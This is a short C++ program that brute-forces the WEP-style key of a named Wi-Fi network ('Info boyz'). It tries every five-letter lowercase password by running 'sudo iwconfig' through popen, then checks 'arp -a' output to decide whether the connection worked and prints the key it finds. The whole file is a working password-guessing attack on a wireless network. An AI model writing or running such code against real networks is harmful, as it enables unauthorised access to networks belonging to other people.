#include <iostream>
#include <vector>
#include <string>
#include <cstdio>

using namespace std;

string exec(const char* cmd) {
    FILE* pipe = popen(cmd, "r");
    if (!pipe) return "ERROR";
    char buffer[256];
    string result = "";
    while(!feof(pipe)) {
    	if(fgets(buffer, 256, pipe) != NULL)
    		result += buffer;
    }
    pclose(pipe);
    return result;
}

void generate(int len,string pass, vector<char>& alph) {
    if (len == static_cast<int>(pass.size())) {
        string networkName = "Info boyz";
        string connCmd =  "sudo iwconfig wlan0 essid \"" + networkName  +"\" key s:" + pass;
        string arpCmd = "arp -a";
        string resp = exec(connCmd.c_str()); 
        resp = exec(arpCmd.c_str());
        if (resp != "") {
            cout << pass << "\n";
            cout << resp;
            exit(0);
        } else {
            cout << "bad :" << pass << "\n";
        }
        return;
    }

    for (char& c : alph) {
        generate(len, pass + c, alph);
    }
}

int main() {
    vector<char> v;
    for (char c = 'a'; c <= 'z'; c++) {
        v.push_back(c);
    }

   // int n = static_cast<int>(v.size());
    generate(5, "", v);
   
    return 0;
}
